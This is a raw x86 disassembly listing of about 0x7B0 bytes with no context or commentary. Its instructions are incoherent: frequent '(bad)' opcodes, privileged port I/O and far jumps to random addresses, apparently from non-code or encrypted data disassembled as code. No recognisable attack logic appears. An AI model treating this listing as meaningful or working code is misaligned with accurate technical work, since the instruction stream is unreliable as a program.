  4205a8:	adc    ebp,DWORD PTR [edx]
  4205aa:	inc    ecx
  4205ab:	popf   
  4205ac:	jno    0x42058d
  4205ae:	jle    0x420606
  4205b0:	push   cs
  4205b1:	iret   
  4205b2:	sti    
  4205b3:	stc    
  4205b4:	into   
  4205b5:	sahf   
  4205b6:	mov    esi,0x547405c
  4205bb:	call   0xf4ee8570
  4205c0:	sub    BYTE PTR [edi+0x3a],ch
  4205c3:	or     al,0x13
  4205c5:	mov    ah,0xd1
  4205c7:	add    ch,BYTE PTR [edx+eiz*1+0x64]
  4205cb:	pop    es
  4205cc:	mov    dl,0xf6
  4205ce:	ficom  WORD PTR [edx+ebx*1-0x2e78ef96]
  4205d5:	ret    0xe9ca
  4205d8:	inc    esi
  4205d9:	push   edi
  4205da:	xchg   esi,eax
  4205db:	and    bh,cl
  4205dd:	xor    al,0x68
  4205df:	pop    edx
  4205e0:	cmp    bl,BYTE PTR [ecx-0x71f13a2b]
  4205e6:	mov    esp,0x9e2f7682
  4205eb:	mov    bl,0x6e
  4205ed:	pop    edi
  4205ee:	test   DWORD PTR [edi+0x59],ecx
  4205f1:	daa    
  4205f2:	test   DWORD PTR [ebx],ecx
  4205f4:	inc    ecx
  4205f5:	rcr    ebp,0x7a
  4205f8:	test   al,0x5b
  4205fa:	out    dx,al
  4205fb:	or     al,0x6c
  4205fd:	mov    eax,ds:0x6258cfe2
  420602:	(bad)  
  420603:	ret    0xcfb7
  420606:	mov    ebx,DWORD PTR [esi-0x7b]
  420609:	mov    cl,0xb2
  42060b:	sbb    BYTE PTR [ecx+0x24],ch
  42060e:	scas   eax,DWORD PTR es:[edi]
  42060f:	mov    bh,0xb5
  420611:	mov    esi,0x395ce2e5
  420616:	add    eax,DWORD PTR [esp+esi*1-0x2e]
  42061a:	shl    DWORD PTR [ecx-0x1653b423],0xc4
  420621:	into   
  420622:	int    0x90
  420624:	dec    esi
  420625:	enter  0x8d1b,0x48
  420629:	call   0xfbfc87fa
  42062e:	push   esi
  42062f:	jns    0x42062f
  420631:	dec    ecx
  420632:	inc    ebx
  420633:	sub    BYTE PTR [esi+0x9],dh
  420636:	cwde   
  420637:	or     ebp,edx
  420639:	mov    ecx,0xa741d642
  42063e:	test   eax,0xb457052
  420643:	sar    DWORD PTR [edx+0x3d],0xea
  420647:	in     eax,0xc
  420649:	mov    dl,BYTE PTR [edx+ebp*1-0x56]
  42064d:	mov    dh,BYTE PTR [ebx-0x32]
  420650:	push   esp
  420651:	popf   
  420652:	arpl   sp,cx
  420654:	dec    ebx
  420655:	loopne 0x420658
  420657:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420659:	out    dx,al
  42065a:	jae    0x4206c2
  42065c:	push   edi
  42065d:	adc    BYTE PTR ds:0x6f2dfeb6,bh
  420663:	pop    esp
  420664:	test   DWORD PTR [ecx],edi
  420666:	push   esi
  420667:	sbb    esi,DWORD PTR [ecx-0x55a39c2d]
  42066d:	dec    eax
  42066e:	xchg   ebx,eax
  42066f:	fmul   QWORD PTR [ecx-0x4f26251]
  420675:	sub    esi,DWORD PTR [ebx-0xe]
  420678:	mov    ebp,0x6c400bd6
  42067d:	jp     0x4206de
  42067f:	adc    BYTE PTR [eax+0x240cc432],al
  420685:	mov    ds:0x73067ecf,al
  42068a:	(bad)  
  42068b:	loopne 0x420700
  42068d:	xchg   BYTE PTR [esp+eax*8-0x6704d4ca],dl
  420694:	test   DWORD PTR [eax+edi*1+0x2],ecx
  420698:	ficomp DWORD PTR [edx-0x35]
  42069b:	push   edx
  42069c:	push   edi
  42069d:	cmp    eax,0x615151b8
  4206a2:	or     ch,BYTE PTR [edx]
  4206a4:	mov    bl,0xa9
  4206a6:	test   eax,0x46c798f5
  4206ab:	inc    esp
  4206ac:	xchg   edx,eax
  4206ad:	jecxz  0x4206a5
  4206af:	mov    ds:0xf40309aa,al
  4206b4:	loopne 0x420643
  4206b6:	add    al,0x48
  4206b8:	push   esi
  4206b9:	les    eax,FWORD PTR [eax+0x522e42d7]
  4206bf:	and    BYTE PTR [eax-0x3e3792ba],ah
  4206c5:	mov    al,ds:0x9ff0cd9c
  4206ca:	imul   edx,DWORD PTR [edx],0xa
  4206cd:	mov    ebx,DWORD PTR [ebx]
  4206cf:	adc    al,0x72
  4206d1:	and    al,0xae
  4206d3:	and    BYTE PTR [edx+0x7c518b25],dh
  4206d9:	scas   al,BYTE PTR es:[edi]
  4206da:	mov    esp,0x137943c2
  4206df:	pop    esp
  4206e0:	pop    ss
  4206e1:	aad    0x66
  4206e3:	adc    al,0xf7
  4206e5:	adc    al,0xf1
  4206e7:	data16 scas al,BYTE PTR es:[edi]
  4206e9:	shl    BYTE PTR [ecx+0x44],0x9d
  4206ed:	and    BYTE PTR [edi-0x7c60da2e],0x67
  4206f4:	call   0xef2:0xe4ffca39
  4206fb:	adc    bl,BYTE PTR [ebx+0x318bed91]
  420701:	enter  0xdb09,0x5
  420705:	mov    dh,0xaf
  420707:	fisubr WORD PTR [ebx]
  420709:	call   0xc0f7ccc8
  42070e:	jmp    0xca4b3e32
  420713:	js     0x4206cb
  420715:	imul   ecx,DWORD PTR [edi+0x7b],0x48
  420719:	sub    dh,cl
  42071b:	jle    0x4206ba
  42071d:	test   al,0x4a
  42071f:	xor    BYTE PTR [esi+esi*8],0x9c
  420723:	push   edx
  420724:	mov    ds:0xcd053597,al
  420729:	jecxz  0x4206e8
  42072b:	(bad)  
  42072c:	(bad)  
  42072d:	xlat   BYTE PTR ds:[ebx]
  42072e:	sub    al,0xd1
  420730:	xor    BYTE PTR [edx],al
  420732:	dec    eax
  420733:	mov    ch,0x38
  420735:	ss push edi
  420737:	(bad)  
  420738:	pop    edi
  420739:	int    0x5c
  42073b:	add    esi,DWORD PTR [ebx+0xaa9b94f]
  420741:	xor    BYTE PTR [ebx],bl
  420743:	mov    bh,BYTE PTR [esi+esi*8+0x21]
  420747:	mov    ds:0x6da1d4e6,eax
  42074c:	imul   ebx,DWORD PTR [edi],0x4b
  42074f:	add    eax,DWORD PTR ss:[edx-0x50d9fb3d]
  420756:	std    
  420757:	stos   DWORD PTR es:[edi],eax
  420758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420759:	in     ax,0xfd
  42075c:	in     eax,dx
  42075d:	stos   BYTE PTR es:[edi],al
  42075e:	jo     0x420707
  420760:	cmc    
  420761:	clc    
  420762:	jmp    0x4207c7
  420764:	push   ds
  420765:	sar    DWORD PTR [ebp+0x2c1d663f],1
  42076b:	jmp    0xa8c2:0xf774a656
  420772:	adc    dh,BYTE PTR [edx+0x44525f09]
  420778:	test   al,0x92
  42077a:	xchg   ecx,eax
  42077b:	test   eax,0xf8b5b790
  420780:	scas   eax,DWORD PTR es:[edi]
  420781:	or     BYTE PTR [ecx+0x64],0x27
  420785:	cld    
  420786:	pop    edx
  420787:	mov    ds:0xef5e8841,eax
  42078c:	mov    al,0x78
  42078e:	outs   dx,BYTE PTR ds:[esi]
  42078f:	clc    
  420790:	mov    WORD PTR [edi+0x3b266c2e],ss
  420796:	push   0xffffffff
  420798:	mov    ecx,0x32196086
  42079d:	inc    ecx
  42079e:	cmp    BYTE PTR [edx],al
  4207a0:	bound  esi,QWORD PTR [eax]
  4207a2:	fs cs inc esi
  4207a5:	out    dx,eax
  4207a6:	arpl   WORD PTR [eax],bp
  4207a8:	jne    0x420829
  4207aa:	sub    esi,DWORD PTR [ebp+ebp*4+0x98e6c4]
  4207b1:	jne    0x420823
  4207b3:	mov    BYTE PTR [edx+0x1e],dh
  4207b6:	jne    0x42081a
  4207b8:	stos   BYTE PTR es:[edi],al
  4207b9:	adc    BYTE PTR [ecx],ch
  4207bb:	and    BYTE PTR [edx+0x49],0x16
  4207bf:	mov    WORD PTR [ebx+0x28],gs
  4207c2:	add    al,0x34
  4207c4:	fmul   DWORD PTR fs:[ecx-0x66cb10fe]
  4207cb:	push   ds
  4207cc:	cli    
  4207cd:	jne    0x420844
  4207cf:	sub    cl,BYTE PTR [ebx-0x4]
  4207d2:	pop    ecx
  4207d3:	hlt    
  4207d4:	test   eax,0x525d32a1
  4207d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207da:	lods   eax,DWORD PTR ds:[esi]
  4207db:	pop    es
  4207dc:	jge    0x4207dd
  4207de:	fnsave [bp+si+0x6572]
  4207e3:	sub    DWORD PTR [ebp-0x3107fbe],edx
  4207e9:	jg     0x420845
  4207eb:	dec    ebx
  4207ec:	and    ebx,esp
  4207ee:	ins    BYTE PTR es:[edi],dx
  4207ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207f0:	mov    ecx,0x837da351
  4207f5:	push   es
  4207f6:	outs   dx,DWORD PTR ds:[esi]
  4207f7:	jl     0x4207f8
  4207f9:	push   eax
  4207fa:	add    eax,0x47ff9ba0
  4207ff:	aas    
  420800:	in     al,0x18
  420802:	ins    BYTE PTR es:[edi],dx
  420803:	imul   eax,DWORD PTR [ebp-0x6f795370],0xffffffcd
  42080a:	jo     0x420814
  42080c:	(bad)  
  42080d:	adc    bl,BYTE PTR [ecx+0x3a]
  420810:	jns    0x42083e
  420812:	jns    0x4207db
  420814:	cmp    ebp,esi
  420816:	mov    al,0xce
  420818:	sbb    eax,0xca0796cb
  42081d:	xlat   BYTE PTR ds:[ebx]
  42081e:	mov    bh,0xe5
  420820:	(bad)  
  420821:	push   eax
  420822:	inc    ebx
  420823:	inc    ecx
  420824:	ret    0xb139
  420827:	mov    al,ds:0xb0c4dcae
  42082c:	push   esi
  42082d:	clc    
  42082e:	or     ch,ah
  420830:	stos   DWORD PTR es:[edi],eax
  420831:	mov    cl,0x45
  420833:	cmp    ah,ah
  420835:	xor    DWORD PTR [edx],edi
  420837:	mov    ecx,0x761d08ac
  42083c:	or     DWORD PTR [ecx-0x4b0d6975],edi
  420842:	push   esi
  420843:	cld    
  420844:	jge    0x42089d
  420846:	sub    ebp,DWORD PTR [ebx+0x7af689c8]
  42084c:	out    dx,al
  42084d:	aad    0x1d
  42084f:	push   ds
  420850:	dec    ebx
  420851:	mov    ch,0xb6
  420853:	jmp    0x4e132b20
  420858:	or     ebx,esi
  42085a:	and    esp,DWORD PTR [ecx+edi*4+0x7677be73]
  420861:	ror    ah,1
  420863:	stos   DWORD PTR es:[edi],eax
  420864:	test   esi,ecx
  420866:	cwde   
  420867:	mov    BYTE PTR [ecx-0x51792a49],al
  42086d:	jecxz  0x4208ce
  42086f:	xor    al,0xd7
  420871:	push   esp
  420872:	jne    0x4208e2
  420874:	adc    esp,DWORD PTR [ebp-0x39]
  420877:	lds    ecx,FWORD PTR [ecx]
  420879:	xchg   BYTE PTR [eax-0x11],ah
  42087c:	ins    BYTE PTR es:[edi],dx
  42087d:	into   
  42087e:	sahf   
  42087f:	ficom  DWORD PTR [eax-0x4f]
  420882:	and    BYTE PTR [edi+0x52],bh
  420885:	scas   eax,DWORD PTR es:[edi]
  420886:	int3   
  420887:	in     al,dx
  420888:	pushf  
  420889:	popf   
  42088a:	mov    cl,0xb5
  42088c:	push   cs
  42088d:	in     al,0x5a
  42088f:	or     eax,0xf65230c6
  420894:	retf   0x29e2
  420897:	push   0xd25e6321
  42089c:	std    
  42089d:	loop   0x420898
  42089f:	cmp    BYTE PTR [edx],0xa5
  4208a2:	pop    es
  4208a3:	fisub  DWORD PTR [esi+0x23]
  4208a6:	cli    
  4208a7:	div    BYTE PTR [edi+0x1f]
  4208aa:	and    al,0x8f
  4208ac:	pop    eax
  4208ad:	mov    ds:0x923f7f34,eax
  4208b2:	push   es
  4208b3:	jnp    0x420902
  4208b5:	mov    ?,WORD PTR [edx]
  4208b7:	sub    bh,al
  4208b9:	adc    BYTE PTR [ecx-0x56bfbd65],dl
  4208bf:	fmul   QWORD PTR [ecx]
  4208c1:	neg    DWORD PTR ss:[ebp+0x50]
  4208c5:	ja     0x42091a
  4208c7:	push   edx
  4208c8:	mov    dh,0xc8
  4208ca:	xor    eax,0xd7931448
  4208cf:	dec    esi
  4208d0:	mov    ah,ch
  4208d2:	push   0x7f
  4208d4:	push   ebp
  4208d5:	fsubr  st(3),st
  4208d7:	sbb    al,0xdf
  4208d9:	sub    bl,dh
  4208db:	xchg   edx,eax
  4208dc:	push   ebx
  4208dd:	icebp  
  4208de:	fist   DWORD PTR [ebx-0x5]
  4208e1:	or     ebx,esp
  4208e3:	hlt    
  4208e4:	cs fcmovbe st,st(3)
  4208e7:	loope  0x42095a
  4208e9:	loop   0x4208d2
  4208eb:	cmp    eax,0x2bd4a417
  4208f0:	repz add DWORD PTR [edx+0x3d],esp
  4208f4:	and    dl,bh
  4208f6:	stc    
  4208f7:	mov    cl,0xc2
  4208f9:	nop/reserved BYTE PTR [ebx]
  4208fc:	mov    eax,0x876a419b
  420901:	pushf  
  420902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420903:	xor    edi,DWORD PTR [eax+0x23d01fd8]
  420909:	xchg   edx,eax
  42090a:	popa   
  42090b:	pop    es
  42090c:	je     0x420896
  42090e:	in     al,0x29
  420910:	sbb    BYTE PTR ds:0xd8dab4b0,bh
  420916:	enter  0xafcc,0x20
  42091a:	sub    DWORD PTR gs:[edx+0x41],0xfffffff0
  42091f:	cmp    esp,DWORD PTR [ebp+0x20d8faf1]
  420925:	xlat   BYTE PTR ds:[ebx]
  420926:	addr16 mov ch,bh
  420929:	data16 cmc 
  42092b:	add    ch,bh
  42092d:	mov    dh,0xf6
  42092f:	mov    bl,0x95
  420931:	pop    ebp
  420932:	xchg   esi,eax
  420933:	jmp    0x892aea40
  420938:	mov    bh,0x1c
  42093a:	out    dx,al
  42093b:	test   BYTE PTR [esp+ebx*2-0x5a4d43bc],cl
  420942:	xor    eax,0x4080bb72
  420947:	mov    bh,0x83
  420949:	ds mov eax,gs
  42094c:	xchg   ebp,eax
  42094d:	fwait
  42094e:	or     ebx,DWORD PTR [ebp+0x721e5058]
  420954:	fwait
  420955:	hlt    
  420956:	dec    edi
  420957:	and    eax,0xc6fb3fa0
  42095c:	int3   
  42095d:	push   ds
  42095e:	jne    0x42094d
  420960:	or     eax,0x41962d1a
  420965:	jbe    0x42094d
  420967:	mov    edx,DWORD PTR [ecx+edx*4-0x23682c9c]
  42096e:	inc    edx
  42096f:	jmp    0xf41a:0x14e0e295
  420976:	pop    eax
  420977:	inc    esp
  420978:	mov    edx,0xea5a1a9a
  42097d:	fcomp  QWORD PTR [ebx-0x1c9d0297]
  420983:	push   esi
  420984:	ret    
  420985:	sahf   
  420986:	adc    al,0x3b
  420988:	dec    ecx
  420989:	es adc eax,0x275658e6
  42098f:	push   ds
  420990:	add    edx,eax
  420992:	sbb    esi,DWORD PTR [ecx]
  420994:	stc    
  420995:	mov    BYTE PTR [esi+eax*1+0x60],0x49
  42099a:	cdq    
  42099b:	pop    esi
  42099c:	or     esi,ecx
  42099e:	imul   edx,DWORD PTR [edx-0x5a98884a],0x5746bd9c
  4209a8:	push   es
  4209a9:	inc    BYTE PTR [esp+ecx*1]
  4209ac:	mov    ds:0x6cc42c14,al
  4209b1:	imul   ebp,DWORD PTR [esi-0x248e3790],0xffffffd6
  4209b8:	out    dx,eax
  4209b9:	pop    ebp
  4209ba:	popa   
  4209bb:	jno    0x4209ed
  4209bd:	dec    ebp
  4209be:	jge    0x420975
  4209c0:	pop    edi
  4209c1:	or     ah,dh
  4209c3:	ja     0x4209c7
  4209c5:	xor    BYTE PTR ds:0x7635c478,cl
  4209cb:	js     0x42096f
  4209cd:	sbb    eax,0x5f9bdd21
  4209d2:	and    dl,BYTE PTR [edx+0x3d01beae]
  4209d8:	and    eax,0x5f47ccd9
  4209dd:	out    0x2e,eax
  4209df:	and    esi,edx
  4209e1:	adc    BYTE PTR [edi],bh
  4209e3:	outs   dx,DWORD PTR ds:[esi]
  4209e4:	xchg   DWORD PTR [edx-0x6c8ecbbd],edi
  4209ea:	or     eax,0x19d7a2a1
  4209ef:	pop    edx
  4209f0:	pusha  
  4209f1:	sub    DWORD PTR [edi-0x1fa2965a],esp
  4209f7:	cmp    ebx,ebp
  4209f9:	data16 outs dx,BYTE PTR ds:[esi]
  4209fb:	je     0x420996
  4209fd:	mov    ss,esp
  4209ff:	out    0xb0,al
  420a01:	aas    
  420a02:	adc    eax,0x9d4ab023
  420a07:	inc    edi
  420a08:	sahf   
  420a09:	stos   DWORD PTR es:[edi],eax
  420a0a:	xchg   esp,edi
  420a0c:	pop    es
  420a0d:	shr    DWORD PTR [ebx-0x6f],1
  420a10:	(bad)  
  420a11:	in     eax,0x40
  420a13:	(bad)  
  420a15:	adc    BYTE PTR [ecx],bl
  420a17:	mov    al,ds:0xba804af2
  420a1c:	out    dx,eax
  420a1d:	les    esp,FWORD PTR [edx-0x287366cd]
  420a23:	push   eax
  420a24:	mov    BYTE PTR [ebx],0x13
  420a27:	(bad)  
  420a28:	mov    ebx,0xf5f89a2f
  420a2d:	(bad)  
  420a2e:	cmp    ah,al
  420a30:	retf   0xa620
  420a33:	cmp    esi,DWORD PTR [edi+0x86291d0]
  420a39:	and    al,bl
  420a3b:	repz mov ebp,0x2d90462e
  420a41:	jmp    0x9fa5:0x53ca9fc0
  420a48:	stos   BYTE PTR es:[edi],al
  420a49:	sbb    edi,DWORD PTR [edi+0x63a4c100]
  420a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a50:	cli    
  420a51:	cmc    
  420a52:	out    dx,eax
  420a53:	inc    esp
  420a54:	ror    DWORD PTR [eax-0x4b39b253],1
  420a5a:	mov    eax,0x5dc8b720
  420a5f:	stos   BYTE PTR es:[edi],al
  420a60:	lock mul BYTE PTR [esi]
  420a63:	pop    edi
  420a64:	bound  edi,QWORD PTR [ebx]
  420a66:	mov    WORD PTR [edx],gs
  420a68:	sti    
  420a69:	inc    edi
  420a6a:	popa   
  420a6b:	icebp  
  420a6c:	das    
  420a6d:	and    eax,0xc62b54e0
  420a72:	xchg   ecx,eax
  420a73:	and    al,0x94
  420a75:	xlat   BYTE PTR ds:[ebx]
  420a76:	neg    ch
  420a78:	repz imul ebp,DWORD PTR ds:0xbadd925c,0xffffffdd
  420a80:	stos   DWORD PTR es:[edi],eax
  420a81:	xchg   esi,eax
  420a82:	inc    ebx
  420a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a84:	inc    edi
  420a85:	and    BYTE PTR cs:[ecx-0x3a],ch
  420a89:	(bad)  
  420a8a:	and    ecx,DWORD PTR [edx+0x6132805d]
  420a90:	inc    ebp
  420a91:	(bad)  
  420a92:	test   eax,0xd643d732
  420a97:	in     eax,0xd5
  420a99:	enter  0x1b82,0x2f
  420a9d:	ret    0xb0d
  420aa0:	cli    
  420aa1:	mov    edi,0x4884c291
  420aa6:	xchg   ecx,eax
  420aa7:	es cld 
  420aa9:	add    al,0x37
  420aab:	add    al,0xf0
  420aad:	sbb    ch,BYTE PTR [edi+esi*8-0x2f]
  420ab1:	nop
  420ab2:	nop
  420ab3:	rcl    BYTE PTR [ecx+0x7b],0x50
  420ab7:	sbb    BYTE PTR [ecx],0x29
  420aba:	xor    bl,BYTE PTR [ebx+0x1e]
  420abd:	fwait
  420abe:	pop    esi
  420abf:	jmp    0x5ff8a46a
  420ac4:	pop    eax
  420ac5:	dec    esi
  420ac6:	mov    esp,0x262b5433
  420acb:	test   al,0xb3
  420acd:	addr16 inc esp
  420acf:	mov    ebp,0xe99da64c
  420ad4:	lods   al,BYTE PTR ds:[esi]
  420ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ad6:	jp     0x420b53
  420ad8:	hlt    
  420ad9:	jmp    0x93e5b52
  420ade:	bound  ebp,QWORD PTR [ebx+0xb]
  420ae1:	pop    ebx
  420ae2:	mov    dh,BYTE PTR [edi-0x2cfe68a8]
  420ae8:	mov    al,ds:0xdd822a9f
  420aed:	fdivp  st(4),st
  420aef:	test   ah,cl
  420af1:	retf   0x86f3
  420af4:	push   ds
  420af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420af6:	dec    esp
  420af7:	ss daa 
  420af9:	adc    dl,dl
  420afb:	jge    0x420b7b
  420afd:	sub    ecx,DWORD PTR [edi]
  420aff:	int3   
  420b00:	xor    BYTE PTR [edx-0x3433b20e],bl
  420b06:	shl    BYTE PTR [edi],0xe8
  420b09:	push   cs
  420b0a:	cmp    al,0xfe
  420b0c:	dec    ebp
  420b0d:	leave  
  420b0e:	out    0x4e,eax
  420b10:	test   BYTE PTR [ecx],dh
  420b12:	fisub  DWORD PTR [ebp-0x78]
  420b15:	xchg   ecx,eax
  420b16:	retf   0xccb9
  420b19:	push   ebp
  420b1a:	sti    
  420b1b:	mov    esp,0x63a90e4
  420b20:	and    eax,0x56d6137f
  420b25:	push   ebx
  420b26:	je     0x420b47
  420b28:	or     BYTE PTR ds:0x921c1980,ch
  420b2e:	(bad)  
  420b2f:	push   ds
  420b30:	aad    0xd
  420b32:	inc    esi
  420b33:	or     BYTE PTR [ebx-0x4ab76908],cl
  420b39:	mov    bl,0x41
  420b3b:	inc    ebx
  420b3c:	push   es
  420b3d:	jno    0x420b25
  420b3f:	jne    0x420b74
  420b41:	jmp    0x19f1c351
  420b46:	das    
  420b47:	push   ebx
  420b48:	imul   ebx,DWORD PTR [eax],0xffffff8f
  420b4b:	(bad)
  420b51:	pop    esi
  420b52:	or     cl,BYTE PTR [eax+0x64f8dcb4]
  420b58:	aam    0xbc
  420b5a:	dec    esp
  420b5b:	fptan  
  420b5d:	xor    eax,0x30d1b3d6
  420b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b63:	xchg   ebp,eax
  420b64:	mov    ah,0x6d
  420b66:	cmp    BYTE PTR [edx+eax*1-0x4a],al
  420b6a:	jnp    0x420b0b
  420b6c:	xor    BYTE PTR es:[ecx+0x37],0x93
  420b71:	mov    dl,0xac
  420b73:	into   
  420b74:	inc    eax
  420b75:	test   BYTE PTR [edx+eiz*8-0x7fa87950],dl
  420b7c:	fld    DWORD PTR [ebx-0x5e8d7c2e]
  420b82:	pop    ebx
  420b83:	pop    ds
  420b84:	pop    ecx
  420b85:	inc    BYTE PTR [esp+ebp*4+0x1c191191]
  420b8c:	xor    BYTE PTR [edi+0x3a],0x73
  420b90:	push   edi
  420b91:	sahf   
  420b92:	dec    ebx
  420b93:	cmpps  xmm2,XMMWORD PTR [edx+0x6f],0x80
  420b98:	dec    esi
  420b99:	sti    
  420b9a:	xor    eax,0xd3aa8343
  420b9f:	(bad)  
  420ba0:	jg     0x420ba3
  420ba2:	jle    0x420be2
  420ba4:	xchg   ebp,eax
  420ba5:	pop    ds
  420ba6:	jbe    0x420bbd
  420ba8:	pop    ds
  420ba9:	pop    esp
  420baa:	pop    edi
  420bab:	and    edx,DWORD PTR [eax+0x3c]
  420bae:	lahf   
  420baf:	mov    ah,0xe8
  420bb1:	jae    0x420bcc
  420bb3:	jne    0x420b51
  420bb5:	jmp    0x420c01
  420bb7:	ficomp DWORD PTR [ebp+0x35]
  420bba:	mov    edi,0xa497b3a2
  420bbf:	ins    DWORD PTR es:[edi],dx
  420bc0:	imul   BYTE PTR [ecx+0x2a7b6580]
  420bc6:	pop    ecx
  420bc7:	mov    ebx,0xb247b56a
  420bcc:	lds    eax,FWORD PTR [edi-0x47d87993]
  420bd2:	pop    ecx
  420bd3:	(bad)  
  420bd4:	fs int 0x13
  420bd7:	inc    esi
  420bd8:	scas   eax,DWORD PTR es:[edi]
  420bd9:	xor    DWORD PTR [esi-0x2e2f1f55],edx
  420bdf:	xor    eax,0x6dc66505
  420be4:	xchg   DWORD PTR [eax],ebx
  420be6:	jl     0x420be6
  420be8:	mov    bh,0x7
  420bea:	sahf   
  420beb:	lods   eax,DWORD PTR ds:[esi]
  420bec:	mov    al,0x6f
  420bee:	das    
  420bef:	mov    edx,DWORD PTR [esp+ebx*4-0x4e2dbf8b]
  420bf6:	es (bad) 
  420bf8:	xchg   edi,eax
  420bf9:	mul    BYTE PTR [ecx-0x12]
  420bfc:	jne    0x420b8d
  420bfe:	sub    cl,al
  420c00:	jp     0x420c65
  420c02:	and    al,cl
  420c04:	js     0x420bfe
  420c06:	(bad)  
  420c07:	(bad)  
  420c08:	cli    
  420c09:	or     BYTE PTR [ebx-0x66a95b0d],al
  420c0f:	jne    0x420bc9
  420c11:	jns    0x420c8a
  420c13:	mov    ch,BYTE PTR [eax+0xd]
  420c16:	psubsw mm7,QWORD PTR [ebx]
  420c19:	pop    esp
  420c1a:	mov    bl,0xe1
  420c1c:	(bad)  
  420c1e:	rcr    BYTE PTR [eax],0x20
  420c21:	cmp    dl,ah
  420c23:	jmp    0xf2b7cf7a
  420c28:	sbb    al,BYTE PTR [edx]
  420c2a:	(bad)  
  420c2b:	aam    0x50
  420c2d:	cmp    eax,0xad59633b
  420c32:	aas    
  420c33:	mov    bh,0x81
  420c35:	leave  
  420c36:	adc    ebp,DWORD PTR [edx]
  420c38:	(bad)  
  420c39:	ins    BYTE PTR es:[edi],dx
  420c3a:	(bad)
  420c3d:	sbb    ecx,DWORD PTR ds:[eax+0x40]
  420c41:	cwde   
  420c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c43:	push   0x2e1349f
  420c48:	jg     0x420c1a
  420c4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c4b:	and    eax,0x287995c9
  420c50:	lods   eax,DWORD PTR ds:[esi]
  420c51:	dec    eax
  420c52:	jmp    0x420c42
  420c54:	xor    ebx,esp
  420c56:	sbb    ah,al
  420c58:	jl     0x420c82
  420c5a:	in     al,0x7
  420c5c:	int    0x6b
  420c5e:	std    
  420c5f:	sub    al,0x2a
  420c61:	mov    BYTE PTR [edx],bh
  420c63:	popf   
  420c64:	and    al,0x94
  420c66:	sbb    bh,BYTE PTR [ebp+0x7a]
  420c69:	je     0x420cdd
  420c6b:	mov    ?,WORD PTR [esi+ebp*8-0x3dfa3901]
  420c72:	add    dh,BYTE PTR [ecx]
  420c74:	ja     0x420bfa
  420c76:	mov    dh,0xe1
  420c78:	call   0x4a86:0x7bc31c06
  420c7f:	sti    
  420c80:	dec    edi
  420c81:	mov    DWORD PTR [edi],ebx
  420c83:	aas    
  420c84:	int3   
  420c85:	or     bl,BYTE PTR ds:0x8b8dc2bf
  420c8b:	add    dh,BYTE PTR [eax]
  420c8d:	lods   eax,DWORD PTR ds:[esi]
  420c8e:	ret    
  420c8f:	enter  0x7fe1,0x24
  420c93:	fmulp  st(7),st
  420c95:	mov    BYTE PTR [eax+0x3b61d12d],ah
  420c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c9c:	adc    eax,DWORD PTR [edx-0x5d96c44b]
  420ca2:	nop
  420ca3:	mov    ebx,0xcd794400
  420ca8:	sub    ch,dl
  420caa:	or     DWORD PTR [edx],eax
  420cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cad:	push   ecx
  420cae:	sub    al,0x22
  420cb0:	inc    ebp
  420cb1:	cmp    ebx,esi
  420cb3:	mov    dh,0x76
  420cb5:	xchg   ecx,eax
  420cb6:	les    ebx,FWORD PTR [esi-0x4ba64a1e]
  420cbc:	adc    al,0x66
  420cbe:	and    BYTE PTR [ebp-0x57],0x34
  420cc2:	cli    
  420cc3:	fld    st(5)
  420cc5:	sbb    bl,BYTE PTR [esi-0x2eee1040]
  420ccb:	imul   edx,DWORD PTR [ebp+0x55b97b74],0x7b
  420cd2:	mov    DWORD PTR [esi-0x20],ecx
  420cd5:	out    dx,al
  420cd6:	xor    ch,BYTE PTR [ebx]
  420cd8:	stos   DWORD PTR es:[edi],eax
  420cd9:	inc    edi
  420cda:	(bad)  
  420cdb:	stos   BYTE PTR es:[edi],al
  420cdc:	cmp    DWORD PTR [edi+0x8],esp
  420cdf:	ds pusha 
  420ce1:	jo     0x420d51
  420ce3:	pop    es
  420ce4:	stos   BYTE PTR es:[edi],al
  420ce5:	inc    esp
  420ce6:	aam    0x5d
  420ce8:	xor    edx,esp
  420cea:	leave  
  420ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cec:	pushf  
  420ced:	sbb    DWORD PTR [ebx+0x4ad5353],esi
  420cf3:	mov    ebx,0xb505af2
  420cf8:	push   ebp
  420cf9:	fstp   TBYTE PTR [edx-0x5]
  420cfc:	outs   dx,DWORD PTR ds:[esi]
  420cfd:	sti    
  420cfe:	push   esp
  420cff:	or     BYTE PTR [eax+0x10],al
  420d02:	in     al,dx
  420d03:	sbb    al,0xbd
  420d05:	nop
  420d06:	dec    ebx
  420d07:	pop    esp
  420d08:	cmp    bl,cl
  420d0a:	inc    ebp
  420d0b:	(bad)  
  420d0d:	lea    eax,[edi+eiz*4-0x57]
  420d11:	fisub  WORD PTR [esi+0xe78f02f]
  420d17:	(bad)  
  420d18:	pop    edi
  420d19:	xchg   esi,eax
  420d1a:	pop    edi
  420d1b:	lods   al,BYTE PTR ds:[esi]
  420d1c:	imul   edx,DWORD PTR [esi+0x5d9e7e9e],0xffffffde
  420d23:	cmp    eax,0x2b85516d
  420d28:	xchg   edi,eax
  420d29:	or     eax,0xcca57da3
  420d2e:	fwait
  420d2f:	int    0xf5
  420d31:	cmp    ecx,DWORD PTR [edx-0x6f8259ac]
  420d37:	into   
  420d38:	or     BYTE PTR [edx],al
  420d3a:	mov    BYTE PTR [esi+0x7d7c9c7a],al
  420d40:	pop    edx
  420d41:	daa    
  420d42:	hlt    
  420d43:	jo     0x420d7b
  420d45:	or     ah,BYTE PTR [eax+ecx*1+0x221b6b02]
  420d4c:	(bad)  
  420d4d:	inc    DWORD PTR [edi-0x2f043549]
  420d53:	data16 mov cl,0x3b
  420d56:	leave  
